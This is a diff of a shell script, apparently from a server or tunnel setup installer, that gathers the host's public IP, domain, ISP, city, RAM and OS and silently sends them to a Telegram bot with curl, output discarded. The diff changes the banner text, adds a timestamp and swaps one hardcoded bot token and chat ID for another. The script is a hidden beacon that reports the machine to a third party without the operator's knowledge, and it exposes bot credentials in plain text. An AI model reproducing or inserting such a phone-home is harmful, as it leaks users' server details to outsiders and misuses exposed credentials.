@@ -10,12 +10,14 @@ NAMECOM=$(wget -qO- ipinfo.io/ip)
 OS=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')
 
 message="
-<u>XLORD TUNNELING</u> <b>ONLINE!!!</b>
+<u>TARAP KUHING EXPOSED</u> <b>ONLINE!!!</b>
 <code>DOMAIN    : </code><code>${domain} (${MYIP})</code>
 <code>ISP       : </code><code>${ISP}, ${CITY}</code>
 <code>RAM       : </code><code>${RAMMS}MB</code>
 <code>LINUX     : </code><code>${OS}</code>
+<code>TIME      : </code><code>${TIME}</code>
 "
 
-curl -s -X POST "https://api.telegram.org/bot5819036885:AAGBzzxgSCojZ80kQVYtq_oAeLlP1lvxUgY/sendmessage" \
--d "chat_id=1356873527" -d "parse_mode=html" -d "text=$message" >/dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot6147646342:AAFPt_iKgJC-wH9eEQdr1Z0lKj4vFQCtXyQ" \
+-d "chat_id=6272457356" -d "parse_mode=html" -d "text=$message" >/dev/null 2>&1
+cd
